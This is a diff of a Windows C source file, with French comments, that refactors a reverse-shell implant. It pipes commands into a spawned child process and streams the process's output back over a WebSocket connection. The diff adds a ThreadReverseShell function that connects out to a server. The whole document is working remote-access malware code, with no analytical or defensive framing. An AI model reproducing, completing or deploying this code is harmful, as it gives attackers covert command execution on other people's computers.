@@ -2,26 +2,9 @@
 
 EXTERN_C_START
 
-DWORD WINAPI ThreadProc(HANDLE wsData)
-{
-    while (TRUE)
-    {
-        CHAR buffer[LWS_PRE + BUFSIZE] = { 0 };
-
-        if (ReadFromPipe((struct WebSocketData*)wsData, buffer, sizeof(buffer)) == FALSE)
-        {
-            printf("Failed to read from stdout in the created thread");
-        }
-
-        printf("%s\n", buffer);
-        lws_write(((struct WebSocketData*)wsData)->socket, (unsigned char*)buffer, strlen(buffer), LWS_WRITE_BINARY);
-    }
-
-    ExitThread(0);
-}
-
+/********************************************************************************************************************************/
 //MODIFIER CETTE FONCTION POUR UNE GESTION D'ERREUR
-BOOL CreatePipes(struct WebSocketData* wsData)
+BOOL CreatePipes(WebSocketData* wsData)
 {
     SECURITY_ATTRIBUTES saAttr;
 
@@ -47,9 +30,8 @@ BOOL CreatePipes(struct WebSocketData* wsData)
 
     return TRUE;
 }
-
-
-int CreateChildProcess(LPCWSTR processName, struct WebSocketData* wsData)
+/********************************************************************************************************************************/
+INT CreateChildProcess(LPCWSTR processName, WebSocketData* wsData)
 // Create a child process that uses the previously created pipes for STDIN and STDOUT.
 {
     PROCESS_INFORMATION piProcInfo;
@@ -91,42 +73,42 @@ int CreateChildProcess(LPCWSTR processName, struct WebSocketData* wsData)
 
     return bSuccess;
 }
-
-BOOL WriteToPipe(char* command, struct WebSocketData* wsData)
+/********************************************************************************************************************************/
+BOOL WriteToPipe(LPSTR command, WebSocketData* wsData)
 {
     DWORD dwWritten;
     BOOL bSuccess = FALSE;
     SetLastError(0);
-    if (WriteFile(wsData->hChildStd_Input_Wr, command, strlen(command), &dwWritten, NULL) == 0)
+    if (WriteFile(wsData->hChildStd_Input_Wr, command, (DWORD)strlen(command), &dwWritten, NULL) == 0)
     {
         printf("Failed");
+        return FALSE;
     }
 
     bSuccess = GetLastError();
 
     return TRUE;
 }
-
-BOOL ReadFromPipe(struct WebSocketData* wsData, char* buffer, size_t length)
+/********************************************************************************************************************************/
+BOOL ReadFromPipe(WebSocketData* wsData, LPSTR buffer, SIZE_T length)
 {
-    DWORD dwRead;
-
+    DWORD dwRead = 0;
     BOOL bSuccess = FALSE;
 
     SetLastError(0);
 
-    if (!ReadFile(wsData->hChildStd_Output_Rd, buffer, length, &dwRead, NULL))
+    if (!ReadFile(wsData->hChildStd_Output_Rd, buffer, (DWORD)length, &dwRead, NULL))
     {
         printf("ReadFile fails - GetLastError(%d)\n", GetLastError());
-        return -1;
+        return FALSE;
     }
 
     bSuccess = GetLastError();
-    PrintError((char*)"ReadFromPipe", bSuccess);
+    PrintError((LPSTR)"ReadFromPipe", bSuccess);
     return TRUE;
 }
-
-void PrintError(char* text, int err)
+/********************************************************************************************************************************/
+VOID PrintError(LPSTR text, INT err)
 {
     DWORD retSize;
     LPSTR pTemp = NULL;
@@ -149,5 +131,35 @@ void PrintError(char* text, int err)
     return;
 
 }
+/********************************************************************************************************************************/
+DWORD WINAPI ThreadProc(HANDLE wsData)
+{
+    while (TRUE)
+    {
+        CHAR buffer[LWS_PRE + BUFSIZE] = { 0 };
+
+        if (ReadFromPipe((struct WebSocketData*)wsData, buffer, sizeof(buffer)) == FALSE)
+        {
+            printf("Failed to read from stdout in the created thread");
+        }
+
+        printf("%s\n", buffer);
+        lws_write(((WebSocketData*)wsData)->socket, (LPBYTE)buffer, strlen(buffer), LWS_WRITE_BINARY);
+    }
+
+    ExitThread(0);
+}
+/********************************************************************************************************************************/
+DWORD WINAPI ThreadReverseShell()
+{
+    if (WS_Connection() == FALSE)
+    {
+        printf("Failed to initiate connection with the server\n");
+        ExitThread(-1);
+    }
+
+    ExitThread(0);
+}
+/********************************************************************************************************************************/
 
 EXTERN_C_END
